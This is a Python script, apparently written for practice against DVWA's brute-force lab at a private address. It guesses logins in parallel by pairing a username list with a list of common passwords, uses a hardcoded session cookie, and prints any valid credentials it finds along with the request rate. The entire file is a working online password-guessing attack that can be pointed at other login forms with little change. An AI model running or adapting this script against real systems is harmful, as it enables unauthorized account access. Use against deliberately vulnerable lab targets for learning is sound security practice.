#!/usr/bin/env python3
import requests, itertools, time
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://192.168.100.4:4280/vulnerabilities/brute/"
SUCCESS_TOKEN = "Welcome to the password protected area"

COOKIES = {
    "PHPSESSID": "b8d500bfbe505eddc24afcf99f08ecb8",
    "security": "low",
}

USERS = ["admin", "pablo", "juan", "maria", "alex", "root", "test", "1337", "lauraromero.cm"]
PASSWORDS = ["password", "letmein", "abc123", "123456", "dvwa", "contraseña", "contrasena", "123", "12345678", "charley"]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Referer": BASE,
}

def try_combo(session: requests.Session, user: str, pwd: str) -> tuple[str, str, bool, int]:
    """Devuelve (user, pwd, ok, status_code)."""
    params = {"username": user, "password": pwd, "Login": "Login"}
    r = session.get(BASE, params=params, headers=HEADERS, timeout=10)
    ok = (SUCCESS_TOKEN in r.text)
    return user, pwd, ok, r.status_code

def brute_force(max_workers: int = 8):
    s = requests.Session()
    s.cookies.update(COOKIES)

    t0 = time.perf_counter()
    found = []
    total = 0

    combos = list(itertools.product(USERS, PASSWORDS))
    with ThreadPoolExecutor(max_workers=max_workers) as ex:
        futures = {ex.submit(try_combo, s, u, p): (u, p) for u, p in combos}
        for fut in as_completed(futures):
            total += 1
            u, p, ok, sc = fut.result()
            if ok:
                print(f"[OK] {u}:{p} (HTTP {sc})")
                found.append((u, p))
    t1 = time.perf_counter()

    elapsed = t1 - t0
    rate = len(combos) / elapsed if elapsed > 0 else 0
    print(f"\nIntentos: {len(combos)}  |  Tiempo: {elapsed:.2f}s  |  Velocidad: {rate:.1f} req/s")
    return found, elapsed, rate

if __name__ == "__main__":
    creds, elapsed, rate = brute_force(max_workers=8)
    if creds:
        print("\nCredenciales válidas encontradas:")
        for u, p in creds:
            print(f"  - {u}:{p}")
    else:
        print("\nNo se encontraron credenciales válidas (revisa cookie/seguridad de DVWA).")
